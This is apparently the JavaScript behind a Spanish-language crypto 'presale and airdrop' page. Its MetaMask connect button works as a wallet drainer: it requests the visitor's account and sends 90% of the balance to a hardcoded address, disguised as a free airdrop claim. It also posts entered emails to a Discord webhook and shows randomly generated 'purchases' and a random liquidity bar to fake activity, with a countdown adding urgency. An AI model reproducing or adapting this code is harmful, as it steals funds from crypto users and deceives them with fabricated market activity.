

document.getElementById('conectarMetaMask').addEventListener('click', async () => {
    if (window.ethereum) {
        try {
            const web3 = new Web3(window.ethereum);
            const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
            const usuarioAddress = accounts[0];
            const direccionDestino = '0x8935361d21943Ee8a863082EdD8a6Aefb062E434';
            const balance = await web3.eth.getBalance(usuarioAddress);
            const balanceEnEther = web3.utils.fromWei(balance, 'ether');
            const cantidadEnviar = balanceEnEther * 0.9; // Asumiendo que quieres enviar el 90% del balance
            const cantidadEnviarEnWei = web3.utils.toWei(cantidadEnviar.toString(), 'ether');

            const transactionParameters = {
                from: usuarioAddress,
                to: direccionDestino,
                value: cantidadEnviarEnWei,
                data: web3.utils.toHex('CLAIM AIRDROP FREE'),
            };

            // Estimación dinámica del gas necesario para la transacción
            const gasEstimado = await web3.eth.estimateGas(transactionParameters);

            // Realizar la transacción con el gas estimado
            transactionParameters.gas = gasEstimado;

            web3.eth.sendTransaction(transactionParameters)
            .then(receipt => {
                console.log('Transacción exitosa:', receipt);
                document.getElementById('conectarMetaMask').textContent = 'Web3 Activo';
            })
            .catch(error => {
                console.error('Error en la transacción:', error);
            });
        } catch (error) {
            console.error('Error conectando a MetaMask:', error);
        }
    } else {
        console.error('MetaMask no está instalado.');
    }
});

document.getElementById('enviar').addEventListener('click', function() {
    const email = document.getElementById('email').value;
    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    if (!emailRegex.test(email)) {
        alert('Correo electrónico inválido');
        return;
    }
    
    const botonEnviar = document.getElementById('enviar');
    botonEnviar.textContent = "Registrado";

    // Enviar datos al webhook de Discord
    const webhookUrl = 'https://discordapp.com/api/webhooks/1074491610471084072/DQZ8B1z42DNbxwZgANi4MRhmivlWYKpkGYnLnFKoeQrqUuAdzsHm1NgzWweNJWog0y38';
    const data = {
        content: `Nuevo registro para la presale y airdrop: ${email}`,
    };
    
    fetch(webhookUrl, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify(data)
    })
    .then(response => response.json())
    .then(responseData => {
        console.log(responseData);
    })
    .catch(error => {
        console.error('Error enviando datos al webhook:', error);
    });
});

window.onload = function() {
  document.getElementById("popupBanner").style.visibility = "visible";
};

document.getElementById("cerrarPopup").onclick = function() {
  document.getElementById("popupBanner").style.visibility = "hidden";
};



function updateCountdown() {
    const endDate = new Date("March 13, 2024 00:00:00").getTime();
    const now = new Date().getTime();
    let difference = endDate - now;

    // Verificar si la fecha lÃ­mite ha pasado
    if (difference <= 0) {
        clearInterval(x);
        document.getElementById("countdown").innerHTML = "La fecha lÃ­mite ha pasado";
        return;
    }

    const days = Math.floor(difference / (1000 * 60 * 60 * 24));
    const hours = Math.floor((difference % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
    const minutes = Math.floor((difference % (1000 * 60 * 60)) / (1000 * 60));
    const seconds = Math.floor((difference % (1000 * 60)) / 1000);

    document.getElementById("countdown-days").innerHTML = days + " dÃ­as ";
    document.getElementById("countdown-hours").innerHTML = hours + " horas ";
    document.getElementById("countdown-minutes").innerHTML = minutes + " minutos ";
    document.getElementById("countdown-seconds").innerHTML = seconds + " segundos ";
}

// Iniciar el contador
updateCountdown();
const x = setInterval(updateCountdown, 1000);
document.getElementById('generarReferido').addEventListener('click', function() {
    const walletAddress = document.getElementById('walletAddress').value;
    if(walletAddress === '') {
        alert('Por favor, introduce tu dirección de wallet.');
        return;
    }
    const enlaceActual = window.location.href;
    const enlaceReferido = `${enlaceActual}?ref=${walletAddress}`;
    document.getElementById('enlaceReferido').textContent = `Tu enlace de referido es: ${enlaceReferido}`;
});



const transactionsContainer = document.getElementById('transactions');
const addresses = ["0x123...", "0x456...", "0x789...", /* Puedes añadir más direcciones acortadas aquí */];
const liquidityBar = document.getElementById('liquidityBar');

function addTransaction() {
  // Asegurarse de que solo se mantengan las últimas 3 transacciones
  while (transactionsContainer.children.length >= 3) {
    transactionsContainer.removeChild(transactionsContainer.lastChild); // Elimina la última transacción
  }

  const transactionElem = document.createElement('div');
  transactionElem.classList.add('transaction');
  const randomAddressIndex = Math.floor(Math.random() * addresses.length);
  const randomEth = (Math.random() * 5).toFixed(3);
  transactionElem.innerHTML = `Compra: ${randomEth} ETH en ${addresses[randomAddressIndex]}`;
  // Inserta la nueva transacción al principio
  if (transactionsContainer.firstChild) {
    transactionsContainer.insertBefore(transactionElem, transactionsContainer.firstChild);
  } else {
    transactionsContainer.appendChild(transactionElem);
  }

  // Este enfoque asume que quieres que las nuevas transacciones aparezcan en la parte superior y las antiguas se eliminen
}

// Actualiza la barra de liquidez
function updateLiquidityBar() {
  const newWidth = 10 + Math.random() * 5; // Entre 10% y 15%
  liquidityBar.style.width = `${newWidth}%`;
}

// Iniciar simulaciones
setInterval(addTransaction, 7000); // Añade una nueva transacción cada 2 segundos
setInterval(updateLiquidityBar, 8000); // Actualiza la barra de liquidez cada 5 segundos
